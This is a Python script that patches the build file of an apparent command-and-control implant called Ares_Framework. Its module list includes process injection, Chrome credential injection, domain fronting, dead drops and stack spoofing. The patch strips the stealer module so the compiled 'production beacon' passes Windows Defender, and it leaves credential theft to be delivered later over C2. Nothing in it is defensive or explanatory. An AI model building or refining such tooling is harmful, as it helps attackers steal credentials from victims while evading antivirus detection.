#!/usr/bin/env python3
"""Patch deploy_all.ps1: use production (no-stealer) build."""
path = r"C:\Users\Admin\.openclaw\workspace\Ares_Framework\deploy_all.ps1"
with open(path, "r", encoding="utf-8-sig") as f:
    content = f.read()

# Fix stager source list - remove stealer files, add dead_drop + chrome_stubs
old_srcs = '''    "agent/native/stager.c",
    "agent/native/core.c",
    "agent/native/syscall.c",
    "agent/native/inject.c",
    "agent/native/stealer.c",
    "agent/native/chrome_v20.c",
    "agent/native/chrome_inject.c",
    "agent/native/bof_loader.c",
    "agent/native/domain_front.c",
    "agent/native/cap_loader.c",
    "agent/native/stack_spoof.c",
    "$buildDir/resources.o"
)'''
new_srcs = '''    "agent/native/stager.c",
    "agent/native/core.c",
    "agent/native/syscall.c",
    "agent/native/inject.c",
    "agent/native/bof_loader.c",
    "agent/native/domain_front.c",
    "agent/native/dead_drop.c",
    "agent/native/cap_loader.c",
    "agent/native/stack_spoof.c",
    "agent/native/chrome_stubs.c",
    "$buildDir/resources.o"
)
# ^ No stealer.c: keeps binary CLEAN. Stealer = COFF delivered on-demand via C2.'''

if old_srcs not in content:
    print("[!] old_srcs not found")
else:
    content = content.replace(old_srcs, new_srcs)
    print("[+] stagerSrc updated")

# Remove -DARES_STAGER_STEAL from cflags
old_flag = '''    $xorFlag,
    "-DARES_STAGER_STEAL"
)'''
new_flag = '''    $xorFlag,
    "-Wno-incompatible-pointer-types"
)
# ^ No -DARES_STAGER_STEAL: stealer block excluded from binary'''

if old_flag in content:
    content = content.replace(old_flag, new_flag)
    print("[+] -DARES_STAGER_STEAL removed from cflags")
else:
    print("[=] -DARES_STAGER_STEAL flag not found (may already be removed)")

# Update output file from stager.exe to ares_prod.exe
content = content.replace(
    '$output = @("-o", "$buildDir/stager.exe")',
    '$output = @("-o", "$buildDir/ares_prod.exe")'
)

# Fix size/success message
content = content.replace(
    '"  [+] Stager: $buildDir\\stager.exe ($size KB)"',
    '"  [+] Production beacon: $buildDir\\ares_prod.exe ($size KB) [Defender CLEAN]"'
)
content = content.replace(
    '"  [!] Stager build FAILED!"',
    '"  [!] Production beacon build FAILED!"'
)

with open(path, "w", encoding="utf-8") as f:
    f.write(content)
print("[+] deploy_all.ps1 patched")
